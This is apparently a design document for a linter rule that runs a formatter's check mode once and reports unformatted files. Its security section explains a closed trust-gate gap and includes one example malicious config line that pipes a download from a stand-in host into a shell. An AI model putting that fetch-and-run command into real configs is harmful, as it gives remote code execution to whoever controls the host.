# `command_idempotent` — a declared check-mode command must be a no-op

Status: **Implemented** — lands with the rule in v0.10 (this
commit; rule kind #6 of the case-study coverage push). Was a
design draft (2026-05-18). v0.10 demand #6 (5 sources,
ROADMAP-canonical). Open questions resolved on implementation:
exit-0-is-clean only, configurable success codes deferred (Q1);
blocking `.output()`, opt-in `timeout:` deferred (Q2);
`files_from` (none/stdout/stderr) + optional `files_pattern`
shipped, structured JSON parsers deferred (Q3); sibling of
`generated_file_fresh` #4, docs cross-link (Q4); the spawn
trust-gate generalised — and the pre-existing
`generated_file_fresh` gate gap closed — in this commit (Q5).
Single-shot (one spawn), not per-file.

Demand evidence:
[`docs/development/launch-evidence.md`](../../development/launch-evidence.md)
("`command_idempotent` mode — run tool in `--check` mode, fail
if the working tree would change", 5+ sources: ruff, prettier,
microsoft/typescript, deno, vscode; promoted from v0.10 design
via the 2026-05-06 deep-analysis aggregation) and the per-repo
tracker in
[`examples/README.md`](../../../examples/README.md#primitive-demand-tracker)
(`command_idempotent` row: ruff, helm, prettier). Canonical
scope: [`../ROADMAP.md`](../ROADMAP.md#v010-case-study-coverage-push)
(#6; "ruff-format / prettier --check / dprint check / deno fmt
--check / eslint --no-fix shape").

## The non-goal tension (read this first)

**alint's deliberate non-goal is formatting / mutating your
code.** A linter that reformats files is a build tool, and that
is out of scope.

`command_idempotent` does *not* cross that line. It runs a
user-declared, maintainer-trusted formatter/checker in **its own
`--check` (idempotence) mode** — the mode that *reports* whether
the tree would change and **exits non-zero without writing
anything**. alint never invokes the tool's mutating mode and
never touches the working tree itself. It is the exact sibling
of `generated_file_fresh` #4: that rule runs a *generator* and
diffs its captured stdout against a committed file;
`command_idempotent` runs a *checker* and trusts the tool's own
`--check` exit code. Same trust tier as the `command` /
`generated_file_fresh` rules (all shell out to a user-declared
CLI). Opt-in: no `command:` is a config error; the rule does
nothing on its own.

## Security — the spawn trust-gate (generalised here)

`command` rules are trust-gated: `alint_dsl::reject_command_rules_in`
(called on every `extends:` parent in `loader.rs`) refuses a
process-spawning rule declared in *any* extended source (local
file, HTTPS URL, `alint://bundled/`) — otherwise a malicious or
compromised ruleset gains arbitrary code execution simply by
being `extends:`'d. The trust boundary is "only the user's own
top-level config may spawn processes."

Before this commit that gate matched **only the literal string
`command`**. `generated_file_fresh` (#4) shells out
identically (`StdCommand…output()` on a user-supplied argv) but
was **never added to the gate** — a real code-execution gap in
shipped-but-unreleased v0.10: an extended ruleset could declare
`kind: generated_file_fresh` with
`command: ["sh","-c","curl evil|sh"]` and execute on every
consumer. Its design doc claimed "same trust tier as the
`command` rule"; the enforcement never matched the claim.

This commit closes that by generalising the gate from one
hardcoded kind to the **set of process-spawning kinds**
(`command`, `generated_file_fresh`, `command_idempotent`). The
function keeps its public name and signature (referenced from
`command.rs`'s module doc and `loader.rs`); only the predicate
and the error wording broaden ("process-spawning rule kind"). A
regression test asserts `generated_file_fresh` *and*
`command_idempotent` in an extended config are rejected, not
just `command`. As `[Unreleased]`, this never reached a release;
it lands as a distinct `### Security` CHANGELOG entry.

## Problem

A repo declares "the tree is formatter-clean" in CI with one of
a recurring family of check-mode invocations:

- `cargo fmt --all -- --check`, `gofmt -l .`
- `ruff format --check .`, `black --check .`
- `prettier --check .`, `eslint --no-fix`
- `dprint check`, `deno fmt --check`
- `mdformat --check`, `markdownlint`

The `command` rule can shell out, but it is **per-file**: it
fans `command` out once per matched path with `{path}`
substitution and only inspects the exit code. The
formatter-clean shape wants the opposite — **one** whole-repo
(or `workdir`-scoped) invocation whose single exit code is the
verdict, and, when it fails, the *list of offending files* the
tool already prints (so CI annotations point at the unformatted
files, not one opaque "command failed"). There is no "run this
checker once; exit 0 = clean; on failure attribute the named
files."

Precise, not heuristic: the verdict is the tool's own
`--check`-mode exit code (and, optionally, its own offender
list parsed verbatim) — alint adds no guessing.

## Surface area

New single-shot rule kind `command_idempotent` in `alint-rules`.
`version: 1` unchanged.

```yaml
- id: code-is-formatted
  kind: command_idempotent
  command: ["cargo", "fmt", "--all", "--", "--check"]  # a check-mode argv (no shell)
  workdir: "."                       # checker cwd, relative to the lint root (default: lint root)
  files_from: stderr                 # none (default) | stdout | stderr
  files_pattern: "Diff in (.+) at"   # optional regex; capture group 1 = a file path (per line)
  level: error
  message: "run `cargo fmt` — code is not formatter-clean"
```

- `command` is an argv array (no shell), spawned with stdin
  closed, stdout/stderr captured, cwd `workdir`. It must be the
  tool's **non-mutating check mode** (`--check` / `-l` / `check`)
  — alint will not run a mutating formatter.
- `files_from` (default `none`): when `stdout` / `stderr`, the
  named stream is parsed on failure to attribute per-file
  violations; `none` ⇒ one violation for the whole invocation.
- `files_pattern` (optional, only with `files_from`): a regex
  whose **capture group 1 is a file path**, applied per output
  line. Bare-path listers (`gofmt -l`, `prettier --check`) need
  no pattern (the whole trimmed line is the path); message-
  wrapped listers (`cargo fmt`'s `Diff in <path> at line N`,
  ruff's `Would reformat: <path>`) supply one.
- Env threaded into the child mirrors `command` /
  `generated_file_fresh`: `ALINT_ROOT`, `ALINT_RULE_ID`,
  `ALINT_LEVEL`, `ALINT_VAR_<NAME>`.

## Semantics

Single-shot (not per-file): the rule evaluates once per run
(`requires_full_index() == true`, `path_scope() == None` — same
dispatch class as `pair` / `generated_file_fresh`; it does not
walk the index, it runs the checker once).

1. Spawn `command` in `workdir`; capture stdout + stderr.
2. **Spawn failure** (program not found, …) ⇒ one violation
   naming the program (a distinct, clearly-worded cause so CI
   triage is immediate — never a silent pass).
3. **Exit 0** ⇒ silent. The tree is idempotent / formatter-clean.
4. **Non-zero exit:**
   - `files_from: none` ⇒ **one** violation anchored at
     `workdir`, message = the truncated tool output (the tree
     would change; the tool's own diagnostics are surfaced).
   - `files_from: stdout|stderr` ⇒ parse that stream line by
     line. Per non-empty trimmed line: if `files_pattern` is
     set, apply it and take capture group 1 as the path (lines
     that don't match are skipped); else the whole trimmed line
     is the path. Emit **one violation per extracted path**,
     anchored at that path. If the stream yields **zero** paths
     (non-zero exit but nothing parseable) ⇒ fall back to a
     single `workdir`-anchored violation with the raw output —
     a non-zero exit is *never* swallowed into a pass.

At most one violation per offending file (or one for the whole
invocation). `expect_exit` is fixed at `0` for v0.10 (every
demand source's check mode is exit-0-clean); a configurable
success set is Open question 1.

## False-positive surface

- **Tool not installed on the runner.** Spawn-failure is a
  *violation*, not a silent pass — distinct and clearly worded
  ("`prettier` not found") for immediate CI triage; users gate
  the rule behind `when:` / an `extends:` profile if the
  toolchain isn't guaranteed (same posture as
  `generated_file_fresh`).
- **`files_pattern` misses.** If `files_from` is set but the
  pattern matches nothing (tool changed its output format), the
  rule does **not** silently pass — it falls back to one
  whole-invocation violation carrying the raw output, so the
  failure is still loud and the misconfiguration visible.
- **Non-deterministic / mutating "check" modes.** A tool whose
  `--check` mode is itself non-deterministic, or one with no
  check mode at all (only in-place), is out of scope: the rule
  trusts the tool's check-mode contract. Documented precondition
  (the demand sources' tools all have a stable `--check`).
- **Wrong mode declared.** If a user points `command` at the
  *mutating* invocation, alint still only reads its exit code
  and never writes — but the rule's contract is "declare the
  check mode"; documented, not enforced (alint can't know a
  third-party tool's flags).
- **Exit semantics.** Some tools exit non-zero on *internal
  error* vs *would-change*. v0.10 treats any non-zero as
  "not clean" (surfacing the tool's stderr distinguishes them
  for the human); a `error_exit:` split is Open question 1.

## Implementation notes

- Module: `crates/alint-rules/src/command_idempotent.rs`. Spawn
  mirrors `generated_file_fresh` exactly (the twin):
  `StdCommand` argv split, `current_dir(ctx.root.join(workdir))`,
  `Stdio::null()` stdin, piped stdout/stderr, the `ALINT_*` env.
  Spawn + capture goes through the shared
  `crate::spawn::run_capturing` helper (added v0.10 post-audit
  P2): one spawn, stdout/stderr drained concurrently while a
  poll loop enforces an opt-in `timeout:` (default 120 s;
  override via `timeout:`). On timeout the checker is killed and
  one violation is emitted. The shared helper preserves full
  output (the `files_from` offender list must not be truncated);
  `command.rs` is left untouched (shipped rule, out of scope).
- Single-shot rule: `impl Rule { rule_common_impl!();
  requires_full_index()->true; path_scope()->None;
  evaluate(ctx) }`. `evaluate` runs the checker and parses its
  output; it does not iterate `ctx.index`.
- `files_from` is a `kebab-case` `Deserialize` enum
  (`None`/`Stdout`/`Stderr`, `#[default] None`), same shape as
  `generated_file_fresh::Normalize`. `files_pattern` compiles to
  `regex::Regex` at `build` time (config error on a bad regex /
  on `files_pattern` without `files_from`).
- **Trust gate:** `command_idempotent` *and* the previously-
  missed `generated_file_fresh` are added to
  `alint_dsl::reject_command_rules_in` (generalised from one
  hardcoded kind to a `SPAWNING_KINDS` set). See the Security
  section.
- No `FileIndex`, no shared `crate::extract`, no `include_str!`
  data; nothing leaves the crate. O(output-lines) parse.

## Tests

- Exit 0 ⇒ silent; non-zero + `files_from: none` ⇒ one
  `workdir`-anchored violation carrying the tool output.
- `files_from: stdout`, no pattern ⇒ one violation per printed
  path (bare-path lister shape); `files_from: stderr` +
  `files_pattern` ⇒ group-1 extraction, non-matching lines
  skipped, correct per-file anchoring.
- `files_from` set but pattern matches nothing on a non-zero
  exit ⇒ single fallback violation (no silent pass).
- Program-not-found ⇒ spawn-failure violation; bad
  `files_pattern` regex / `files_pattern` without `files_from`
  ⇒ build error; empty `command` ⇒ build error.
- Trust gate: an *extended* config declaring
  `kind: command_idempotent` **and** one declaring
  `kind: generated_file_fresh` are both rejected by
  `reject_command_rules_in` (the regression test for the closed
  gap); a top-level `command_idempotent` is allowed.
- Tests use a trivially portable checker (`sh -c 'exit N'` /
  `printf` of a fake offender list) + a tempdir, Unix-gated like
  `command`'s tests (no `/bin/sh` on Windows CI).
- Lockstep with the codebase invariants (same checklist #1–#5
  followed): `coverage_audit_pass_fail` (pass + fail e2e
  scenarios, portable command), schema `$def` + dispatch `$ref`
  in both mirrored `config.json`, `all_kinds.yaml` entry,
  regenerated default-options snapshot, rule-count **75 → 76**
  across README ×2 / `docs/site/about` /
  `coverage_audit_readme_claims`, `docs/rules.md` section,
  CHANGELOG `[Unreleased]` Added (the sixth v0.10 item) + a
  distinct `### Security` entry for the gate fix.
- **Bench-compare threshold:** one process spawn at run end,
  excluded from the hot per-file path. Full-run S-class wall
  must not regress vs the pre-phase baseline (`xtask
  bench-gate`, per `RELEASING.md`) — a single spawn is
  negligible at scale (same class as `generated_file_fresh`).

## Open questions

Resolve inline when implementation lands.

1. **Configurable success / error exit codes.** v0.10 fixes
   "exit 0 = clean", any non-zero = not clean. A tool that
   distinguishes "would change" (e.g. exit 1) from "internal
   error" (exit 2) could let users split those into
   different levels via `error_exit:` / `success_exit:`. No
   demand source needs it (all are exit-0-clean); deferred,
   the tool's stderr already distinguishes them for the human.
2. **Timeout.** *Resolved (v0.10 post-audit P2).* Opt-in
   `timeout:` (seconds, default 120) via the shared
   `crate::spawn::run_capturing` helper (concurrent pipe-drain +
   poll/kill), mirroring `generated_file_fresh`. A hung checker
   now yields one timeout violation instead of hanging the run.
3. **Structured offender parsers.** `files_from` + regex covers
   the line-oriented tools (the entire demand set). A built-in
   `format: json` for tools with `--format json`
   (eslint/prettier) is a v0.11 ergonomics call; the regex
   escape hatch covers them today.
4. **Relationship to `generated_file_fresh` (#4) and `command`.**
   Siblings, not the same kind: `generated_file_fresh` diffs a
   *generator's* captured stdout against a committed file;
   `command_idempotent` trusts a *checker's* own `--check` exit
   code (+ optional offender list); `command` is the per-file
   fan-out. Docs cross-link.
5. **The spawn trust-gate.** Resolved in this commit:
   generalised `reject_command_rules_in` to the set of
   process-spawning kinds and closed the pre-existing
   `generated_file_fresh` gap. See the Security section.
